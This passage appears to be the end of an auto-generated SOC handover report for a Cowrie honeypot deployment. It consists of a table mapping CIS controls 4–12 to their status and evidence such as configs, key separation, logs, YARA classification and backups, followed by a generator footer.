| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-01T10:04:09Z_
